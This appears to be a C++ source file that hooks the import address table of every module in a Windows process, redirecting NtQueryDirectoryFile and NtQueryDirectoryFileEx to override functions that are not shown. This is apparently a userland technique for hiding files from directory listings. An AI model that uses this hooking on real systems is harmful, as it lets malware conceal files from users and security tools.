#include "pch.h"
#include "hookers.h"
#include "types.h"
#include "overridefuncs.h"

//This function use was for debugging and understanding the Windows Shell behaviour
//void Log(HANDLE FileHandle, LPCSTR FunctionName, FILE_INFORMATION_CLASS FileInformationClass)
//{
//	FILE* log_file;
//	errno_t err;
//	err = fopen_s(&log_file, LOGFILEPATH, 'a');
//	if (err != 0)
//		return;
//
//	WCHAR path[MAX_PATH + 1];
//	GetFinalPathNameByHandleW(FileHandle, path, MAX_PATH, 0);
//	if (wcscmp(path, PATHTOIGNORE) != 0)
//	fwprintf(log_file, L"DEBUG: Called %s with filename %s. FILE_XXX_CLASS = %d.\n", FunctionName, path, FileInformationClass);
//	fclose(log_file);
//}

// Hook the IAT of a module
void HookIAT(LPCWSTR modulename, LPCSTR OverridenFuncName, DWORD64 NewFunc)
{
	DWORD64 base = (DWORD64)GetModuleHandleW(modulename);
	PIMAGE_DOS_HEADER dosheader = (PIMAGE_DOS_HEADER)base;
	PIMAGE_NT_HEADERS ntheader = (PIMAGE_NT_HEADERS)(base + dosheader->e_lfanew);
	IMAGE_OPTIONAL_HEADER optionalheader = ntheader->OptionalHeader;
	IMAGE_DATA_DIRECTORY datadir = optionalheader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

	// make sure IAT isn't empty
	if (datadir.VirtualAddress == 0)
		return;

	PIMAGE_IMPORT_DESCRIPTOR ImportedModule = (PIMAGE_IMPORT_DESCRIPTOR)(base + datadir.VirtualAddress); // start of import table
	PIMAGE_THUNK_DATA FirstThunk, OriginalFirstThunk;
	LPCSTR ImportedFunctionName;
	DWORD CurrentProtection, Junk;
	BOOL virtualprotectstatus;

	/*std::wofstream log_file_ord;
	log_file_ord.open(LOGFILEPATH, std::ios_base::app);*/

	while (ImportedModule->Characteristics != 0)
	{
		OriginalFirstThunk = (PIMAGE_THUNK_DATA)(base + ImportedModule->OriginalFirstThunk); // VA for ILT
		FirstThunk = (PIMAGE_THUNK_DATA)(base + ImportedModule->FirstThunk); // VA for IAT

		while (OriginalFirstThunk->u1.AddressOfData != 0)
		{
			if (OriginalFirstThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG)
				// import by ordinal
			{
			}
			else
				// import by name
			{
				ImportedFunctionName = (LPCSTR)((PIMAGE_IMPORT_BY_NAME)(base + OriginalFirstThunk->u1.AddressOfData))->Name;
				if (strcmp(ImportedFunctionName, OverridenFuncName) == 0)
				{
					// Disable IAT write protection
					virtualprotectstatus = VirtualProtect(FirstThunk, 4096, PAGE_READWRITE, &CurrentProtection);

					// Modify IAT
					FirstThunk->u1.Function = (DWORD64)NewFunc;

					// log_file_ord << "DEBUG: hooked " << ImportedFunctionName << " from " << (char*)(base + ImportedModule->Name) << " imported by " << modulename << ".\n";

					// Restore the write protection
					virtualprotectstatus = VirtualProtect(FirstThunk, 4096, CurrentProtection, &Junk);
				}
			}


			FirstThunk++;
			OriginalFirstThunk++;
		}
		ImportedModule++;
	}
	// log_file_ord.close();
}

// Iterate through all the modules of process PID and hook them
void HookAllModules(DWORD processID)
{
	HMODULE hMods[1024]; // modules of exe
	HANDLE hProcess; // process handle
	DWORD cbNeeded;

	hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID);
	if (hProcess == NULL)
		return;

	// Get a list of all the modules in this process.
	if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded))
	{
		for (int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++)
		{
			WCHAR modulename[MAX_PATH];

			// Get the full path to the module's file.
			if (GetModuleFileNameEx(hProcess, hMods[i], modulename, sizeof(modulename) / sizeof(WCHAR)))
			{
				HookIAT(modulename, "NtQueryDirectoryFile", (DWORD64)&OverrideNtQueryDirectoryFile);
				HookIAT(modulename, "NtQueryDirectoryFileEx", (DWORD64)&OverrideNtQueryDirectoryFileEx);
			}
		}
	}

	// Release the handle to the process.

	CloseHandle(hProcess);
}